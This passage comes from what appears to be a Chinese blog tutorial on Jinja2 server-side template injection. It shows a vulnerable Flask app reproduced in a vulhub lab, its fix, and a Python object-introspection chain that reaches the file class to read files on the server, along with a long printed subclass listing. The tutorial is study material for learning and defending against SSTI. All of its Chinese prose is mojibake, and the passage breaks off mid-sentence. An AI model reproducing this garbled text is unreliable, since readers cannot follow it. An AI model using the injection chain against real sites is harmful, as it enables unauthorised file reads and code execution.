ä¸å±äºä»»ä½•ä¸€ç§è¯­è¨€ï¼Œæ²™ç›’ç»•è¿‡ä¹Ÿä¸æ˜¯ï¼Œæ²™ç›’ç»•è¿‡åªæ˜¯ç”±äºæ¨¡æ¿å¼•æ“å‘ç°äº†å¾ˆå¤§çš„å®‰å…¨æ¼æ´ï¼Œç„¶åæ¨¡æ¿å¼•æ“è®¾è®¡å‡ºæ¥çš„ä¸€ç§é˜²æŠ¤æœºåˆ¶ï¼Œä¸å…è®¸ä½¿ç”¨æ²¡æœ‰å®šä¹‰æˆ–è€…å£°æ˜çš„æ¨¡å—ï¼Œè¿™é€‚ç”¨äºæ‰€æœ‰çš„æ¨¡æ¿å¼•æ“ã€‚</p><h2 id="Pythonä¸­çš„SSTI"><a href="#Pythonä¸­çš„SSTI" class="headerlink" title="Pythonä¸­çš„SSTI"></a>Pythonä¸­çš„SSTI</h2><p>pythonå¸¸è§çš„æ¨¡æ¿æœ‰ï¼šJinja2ï¼Œtornadoã€‚</p><p>Jinja2æ˜¯ä¸€ç§é¢å‘Pythonçš„ç°ä»£å’Œè®¾è®¡å‹å¥½çš„æ¨¡æ¿è¯­è¨€ï¼Œå®ƒæ˜¯ä»¥Djangoçš„æ¨¡æ¿ä¸ºæ¨¡å‹çš„</p><p>Jinja2æ˜¯Flaskæ¡†æ¶çš„ä¸€éƒ¨åˆ†ã€‚Jinja2ä¼šæŠŠæ¨¡æ¿å‚æ•°æä¾›çš„ç›¸åº”çš„å€¼æ›¿æ¢äº†  å—</p><p>Jinja2ä½¿ç”¨ ç»“æ„è¡¨ç¤ºä¸€ä¸ªå˜é‡ï¼Œå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„å ä½ç¬¦ï¼Œå‘Šè¯‰æ¨¡ç‰ˆå¼•æ“è¿™ä¸ªä½ç½®çš„å€¼ä»æ¸²æŸ“æ¨¡ç‰ˆæ—¶ä½¿ç”¨çš„æ•°æ®ä¸­è·å–ã€‚</p><p>è¯­æ³•ï¼š</p><p><code>&#123;&#123; ... &#125;&#125;</code> æ˜¯æ‰§è¡Œè¡¨è¾¾å¼å¹¶æŠŠç»“æœæ’å…¥é¡µé¢çš„ä½ç½®</p><p><code>&#123;% ... %&#125; </code>ç”¨æ¥å£°æ˜å˜é‡ï¼Œä¹Ÿå¯ä»¥ç”¨äºå¾ªç¯è¯­å¥å’Œæ¡ä»¶è¯­å¥ </p><p>è¿™è¾¹ä½¿ç”¨vulhubæä¾›çš„ç¯å¢ƒè¿›è¡Œå¤ç°ï¼Œæ­å»ºæˆåŠŸåè®¿é—®é¦–é¡µå¦‚å›¾ï¼š</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903130838384-1719222659.png"><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/1344396-20200903130838384-1719222659.png" alt="img"></a></p><p>è¿›å…¥dockerå®¹å™¨æ¥çœ‹ä¸€ä¸‹webä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br><br>    t = Template(<span class="hljs-string">&quot;Hello &quot;</span> + name)<br>    <span class="hljs-keyword">return</span> t.render()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>t &#x3D; Template(â€œhelloâ€ + name) è¿™è¡Œä»£ç è¡¨ç¤ºï¼Œå°†å‰ç«¯è¾“å…¥çš„nameæ‹¼æ¥åˆ°æ¨¡æ¿ï¼Œæ­¤æ—¶nameçš„è¾“å…¥æ²¡æœ‰ç»è¿‡ä»»ä½•æ£€æµ‹ï¼Œå°è¯•ä½¿ç”¨æ¨¡æ¿è¯­è¨€æµ‹è¯•ï¼š</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-17_16-26-09.png" alt="PixPin_2025-07-17_16-26-09"></p><p>å¦‚æœä½¿ç”¨ä¸€ä¸ªå›ºå®šå¥½äº†çš„æ¨¡æ¿ï¼Œåœ¨æ¨¡æ¿æ¸²æŸ“ä¹‹åä¼ å…¥æ•°æ®ï¼Œå°±ä¸å­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œå°±å¥½åƒSQLæ³¨å…¥çš„é¢„ç¼–è¯‘ä¸€æ ·ï¼Œä¿®å¤ä¸Šé¢ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)<br><br>    t = Template(<span class="hljs-string">&quot;Hello &#123;&#123;n&#125;&#125;&quot;</span>)<br>    <span class="hljs-keyword">return</span> t.render(n=name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘è¿è¡Œï¼Œå†æ¬¡æ³¨å…¥å°±ä¼šå¤±è´¥</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-17_16-43-39.png" alt="PixPin_2025-07-17_16-43-39"></p><ul><li><p>ä¹‹å‰å†™çš„æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">t = Template(<span class="hljs-string">&quot;Hello &quot;</span> + name)<br><span class="hljs-keyword">return</span> t.render()<br></code></pre></td></tr></table></figure><p>è¿™ä¼š<strong>æŠŠç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼è¿›æ¨¡æ¿å­—ç¬¦ä¸²</strong>ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥å¸¦æœ‰ <code>&#123;&#123; ... &#125;&#125;</code>ï¼Œå°±ä¼šè¢«å½“ä½œä»£ç æ‰§è¡Œï¼Œå¯¼è‡´ SSTI æ¼æ´ã€‚</p></li><li><p>ç°åœ¨è¿™æ®µä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">t = Template(<span class="hljs-string">&quot;Hello &#123;&#123;n&#125;&#125;&quot;</span>)<br><span class="hljs-keyword">return</span> t.render(n=name)<br></code></pre></td></tr></table></figure><p><strong>æ¨¡æ¿å­—ç¬¦ä¸²æ˜¯å›ºå®šçš„</strong>ï¼Œå˜é‡å€¼é€šè¿‡å‚æ•°ä¼ å…¥ï¼ŒJinja2 åªä¼šæŠŠå˜é‡å†…å®¹ä½œä¸ºçº¯æ–‡æœ¬æ’å…¥ï¼Œä¸ä¼šæ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚</p></li></ul><p>ç”±äºåœ¨jinja2ä¸­æ˜¯å¯ä»¥ç›´æ¥è®¿é—®pythonçš„ä¸€äº›å¯¹è±¡åŠå…¶æ–¹æ³•çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ„é€ ç»§æ‰¿é“¾æ¥æ‰§è¡Œä¸€äº›æ“ä½œï¼Œæ¯”å¦‚æ–‡ä»¶è¯»å–ï¼Œå‘½ä»¤æ‰§è¡Œç­‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">__dict__ã€€ã€€ ï¼šä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸<br>__class__ã€€ã€€ï¼šè¿”å›ä¸€ä¸ªå®ä¾‹æ‰€å±çš„ç±»<br>__mro__ã€€ã€€  ï¼šè¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚<br>__bases__ã€€ã€€ï¼šä»¥å…ƒç»„å½¢å¼è¿”å›ä¸€ä¸ªç±»ç›´æ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå¯ä»¥ç†è§£ä¸ºç›´æ¥çˆ¶ç±»ï¼‰<br>__base__ã€€ã€€ ï¼šå’Œä¸Šé¢çš„baseså¤§æ¦‚ç›¸åŒï¼Œéƒ½æ˜¯è¿”å›å½“å‰ç±»æ‰€ç»§æ‰¿çš„ç±»ï¼Œå³åŸºç±»ï¼ŒåŒºåˆ«æ˜¯baseè¿”å›å•ä¸ªï¼Œbasesè¿”å›æ˜¯å…ƒç»„<br>// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„<br>__subclasses__ã€€ã€€ï¼šä»¥åˆ—è¡¨è¿”å›ç±»çš„å­ç±»<br>__init__ã€€ã€€ ï¼šç±»çš„åˆå§‹åŒ–æ–¹æ³•<br>__globals__ã€€ã€€   ï¼šå¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨<br>__builtin__&amp;&amp;__builtins__ã€€ã€€ï¼špythonä¸­å¯ä»¥ç›´æ¥è¿è¡Œä¸€äº›å‡½æ•°ï¼Œä¾‹å¦‚<span class="hljs-built_in">int</span>()ï¼Œ<span class="hljs-built_in">list</span>()ç­‰ç­‰ã€‚ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<br>è¿™äº›å‡½æ•°å¯ä»¥åœ¨__builtin__å¯ä»¥æŸ¥åˆ°ã€‚æŸ¥çœ‹çš„æ–¹æ³•æ˜¯<span class="hljs-built_in">dir</span>(__builtins__)ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<br>åœ¨py3ä¸­__builtin__è¢«æ¢æˆäº†builtinã€€<br><br><span class="hljs-number">1.</span>åœ¨ä¸»æ¨¡å—mainä¸­ï¼Œ__builtins__æ˜¯å¯¹å†…å»ºæ¨¡å—__builtin__æœ¬èº«çš„å¼•ç”¨ï¼Œå³__builtins__å®Œå…¨ç­‰ä»·äº__builtin__ã€‚ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<span class="hljs-number">2.</span>éä¸»æ¨¡å—mainä¸­ï¼Œ__builtins__ä»…æ˜¯å¯¹__builtin__.__dict__çš„å¼•ç”¨ï¼Œè€Œé__builtin__æœ¬èº«<br></code></pre></td></tr></table></figure><h2 id="ç”¨fileå¯¹è±¡è¯»å–æ–‡ä»¶-python2"><a href="#ç”¨fileå¯¹è±¡è¯»å–æ–‡ä»¶-python2" class="headerlink" title="ç”¨fileå¯¹è±¡è¯»å–æ–‡ä»¶(python2)"></a>ç”¨fileå¯¹è±¡è¯»å–æ–‡ä»¶(python2)</h2><p>python2åœ¨çº¿ç¼–è¯‘ï¼š<a href="https://www.jyshare.com/compile/6/">Python2 åœ¨çº¿å·¥å…· | èœé¸Ÿå·¥å…·</a></p><h3 id="ä»£ç è§£æ"><a href="#ä»£ç è§£æ" class="headerlink" title="ä»£ç è§£æ"></a>ä»£ç è§£æ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> &#123;&#125;.__class__.__base__.__subclasses__():<br>    <span class="hljs-keyword">if</span>(c.__name__==<span class="hljs-string">&#x27;file&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(c)<br>        <span class="hljs-built_in">print</span> c(<span class="hljs-string">&#x27;joker.txt&#x27;</span>).readlines()<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ç”¨ Python å†™çš„ï¼Œä¸»è¦ç›®çš„æ˜¯é€šè¿‡ Python å†…ç½®ç±»å‹çš„åå°„æœºåˆ¶ï¼ŒæŸ¥æ‰¾å¹¶ä½¿ç”¨æ–‡ä»¶ï¼ˆ<code>file</code>ï¼‰ç±»ï¼Œæ‰“å¼€å¹¶è¯»å–åä¸º <code>joker.txt</code> çš„æ–‡ä»¶å†…å®¹ã€‚ä¸‹é¢è¯¦ç»†è§£é‡Šï¼š</p><ol><li><code>&#123;&#125;.__class__</code></li></ol><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-17_17-07-31-1752757692469-13.png" alt="PixPin_2025-07-17_17-07-31"></p><ul><li><code>&#123;&#125;</code> æ˜¯ä¸€ä¸ªç©ºå­—å…¸ï¼Œç±»å‹æ˜¯ <code>dict</code>ã€‚</li><li><code>&#123;&#125;.__class__</code> å°±æ˜¯ <code>&lt;class &#39;dict&#39;&gt;</code>ï¼Œå³å­—å…¸çš„ç±»å¯¹è±¡ã€‚</li></ul><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-17_17-07-31.png" alt="PixPin_2025-07-17_17-07-31">    2.<code>&#123;&#125;.__class__.__base__</code></p><ul><li><p><code>dict</code> çš„åŸºç±»ï¼ˆçˆ¶ç±»)ï¼Œé€šå¸¸æ˜¯ <code>object</code>ã€‚</p></li><li><p>ä¹Ÿå°±æ˜¯è·å–å­—å…¸çš„çˆ¶ç±»ã€‚<img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-17_17-07-58.png" alt="PixPin_2025-07-17_17-07-58"></p></li></ul><ol start="3"><li><code>&#123;&#125;.__class__.__base__.__subclasses__()</code></li></ol><ul><li><code>object</code> ç±»æœ‰ä¸ªæ–¹æ³• <code>__subclasses__()</code>ï¼Œè¿”å›æ‰€æœ‰ç›´æ¥ç»§æ‰¿è‡ªå®ƒçš„å­ç±»åˆ—è¡¨ã€‚</li><li>è¿™æ®µä»£ç ç”¨ <code>object</code> è¿™ä¸ªåŸºç±»è°ƒç”¨ <code>__subclasses__()</code>ï¼Œè·å–ç³»ç»Ÿä¸­æ‰€æœ‰ç»§æ‰¿è‡ª <code>object</code> çš„ç±»åˆ—è¡¨ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(&#123;&#125;.__class__.__base__.__subclasses__()):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;i&#125;: &#123;c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i=i, c=c))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;<br><span class="hljs-number">1</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;<br><span class="hljs-number">2</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;<br><span class="hljs-number">3</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;<br><span class="hljs-number">4</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;<br><span class="hljs-number">5</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;<br><span class="hljs-number">6</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;<br><span class="hljs-number">7</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;<br><span class="hljs-number">8</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;<br><span class="hljs-number">9</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;<br><span class="hljs-number">10</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;<br><span class="hljs-number">11</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;<br><span class="hljs-number">12</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;<br><span class="hljs-number">13</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br><span class="hljs-number">14</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;<br><span class="hljs-number">15</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;<br><span class="hljs-number">16</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;<br><span class="hljs-number">17</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;<br><span class="hljs-number">18</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;<br><span class="hljs-number">19</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;<br><span class="hljs-number">20</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;<br><span class="hljs-number">21</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;<br><span class="hljs-number">22</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;<br><span class="hljs-number">23</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;<br><span class="hljs-number">24</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;<br><span class="hljs-number">25</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;<br><span class="hljs-number">26</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;<br><span class="hljs-number">27</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;<br><span class="hljs-number">28</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;<br><span class="hljs-number">29</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;<br><span class="hljs-number">30</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;<br><span class="hljs-number">31</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;<br><span class="hljs-number">32</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;<br><span class="hljs-number">33</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;<br><span class="hljs-number">34</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;<br><span class="hljs-number">35</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;<br><span class="hljs-number">36</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;<br><span class="hljs-number">37</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;<br><span class="hljs-number">38</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;<br><span class="hljs-number">39</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;<br><span class="hljs-number">40</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;<br><span class="hljs-number">41</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;<br><span class="hljs-number">42</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;<br><span class="hljs-number">43</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;<br><span class="hljs-number">44</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;<br><span class="hljs-number">45</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;<br><span class="hljs-number">46</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;<br><span class="hljs-number">47</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;<br><span class="hljs-number">48</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;<br><span class="hljs-number">49</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;<br><span class="hljs-number">50</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;<br><span class="hljs-number">51</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;<br><span class="hljs-number">52</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;<br><span class="hljs-number">53</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;<br><span class="hljs-number">54</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;<br><span class="hljs-number">55</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;<br><span class="hljs-number">56</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;<br><span class="hljs-number">57</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;<br><span class="hljs-number">58</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;<br><span class="hljs-number">59</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;<br><span class="hljs-number">60</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;<br><span class="hljs-number">61</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;<br><span class="hljs-number">62</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;<br><span class="hljs-number">63</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;<br><span class="hljs-number">64</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;<br><span class="hljs-number">65</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;<br><span class="hljs-number">66</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;<br><span class="hljs-number">67</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;<br><span class="hljs-number">68</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;<br><span class="hljs-number">69</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;<br><span class="hljs-number">70</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;<br><span class="hljs-number">71</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;<br><span class="hljs-number">72</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;<br><span class="hljs-number">73</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;<br><span class="hljs-number">74</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;<br><span class="hljs-number">75</span>: &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;<br><span class="hljs-number">76</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;<br><span class="hljs-number">77</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;<br><span class="hljs-number">78</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°fileç±»æ˜¯ç¬¬40ä¸ªã€‚</p><ol start="4"><li><code>for c in ...</code></li></ol><ul><li>éå†æ‰€æœ‰çš„ <code>object</code> çš„å­ç±»ã€‚</li></ul><ol start="5"><li><code>if(c.__name__==&#39;file&#39;)</code></li></ol><ul><li>åˆ¤æ–­å½“å‰ç±»çš„åå­—æ˜¯å¦æ˜¯å­—ç¬¦ä¸² 